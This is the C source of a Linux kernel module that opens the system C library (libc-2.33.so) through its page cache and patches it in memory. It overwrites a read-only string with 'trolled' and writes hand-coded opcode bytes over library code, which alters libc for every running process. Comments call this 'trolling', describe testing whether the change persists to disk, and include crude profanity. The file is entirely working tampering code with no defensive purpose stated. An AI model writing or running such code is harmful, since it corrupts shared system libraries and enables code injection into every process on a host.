
#include "taskutil.h"
#include "regset.h"
#include "memutil.h"
#include "depend.h"
#include "address_space.h"

#ifndef VICTIM_FILE
#define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
#endif

#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"

#define STRINGIFY(A) #A
#define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.

char* troll = "trolled";


char trolling_opcodes[] = { 0x48, 0xC7, 0xC6, 0x30, 0x10, 0x19, 0x00, 0x80, 0x80, 0x80 }; //append with a shit ton of nops
int init_module(void)
{
 	void* map;
  char* ptr;
  struct page* page;
  int count;
  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);
//  printk("path after stringify %d\n", linux); //stupid fucking macro nobody like you you cuck fuck you
	struct inode* i = get_file_path(path);//
  if(!i){
    printk(KERN_INFO "Invalid path\n");
    return 0;
  }
  printk(KERN_INFO "Path Succeeded\n");



  if(i -> i_mapping == NULL){
    printk(KERN_INFO "This page does not have an address_space object\n");
    return 0;
  }
  printk(KERN_INFO "This page has an address_space object\n");
	//page = find_get_page(i->i_mapping,0); // nah this is fine
  page = find_page_inode(i, 0x00191020); //ok so this actually works
  if(!page){
    printk(KERN_INFO "Page failed\n");
    return 0;
  }
  map = kmap(page);
  //printk(KERN_INFO "%c", *((char*)map + pg_off(0x00191030)));
  ptr = (char*)map + pg_off(0x00191030); //.rodata location
  for(count = 0; count<7; count++,ptr++){ //doin a little trolling
    *ptr = *(troll+count);
  }
  kunmap(map);

  page = find_page_inode(i, 0x00107c14);
  map = kmap(page);
  ptr = (char*)map + pg_off(0x00107c14);
  for(count = 0; count < 10; count++, ptr++){
    *ptr = trolling_opcodes[count];
  }
  kunmap(map);

  //SetPageDirty(page); //this fixes it thus proving that it is not a bug in the writeback daemon

  if(PageDirty(page)){
    printk(KERN_INFO "Its Dirty!\n");
  }else{
    printk(KERN_INFO "Its clean!\n");
  }
  if(PagePrivate(page)){
    printk(KERN_INFO "It has page buffers");

  }else{
    printk(KERN_INFO "It does not have page buffers");
  }
  printk(KERN_INFO "%lu\n", page -> flags);

  ClearPageReferenced(page); //make sure to clear page references

  printk(KERN_INFO "%lu\n", page -> flags); //theres some random high bit set
  return 0;
}

void cleanup_module(void)
{
	printk("Module cleanup\n");
}
MODULE_LICENSE("GPL");
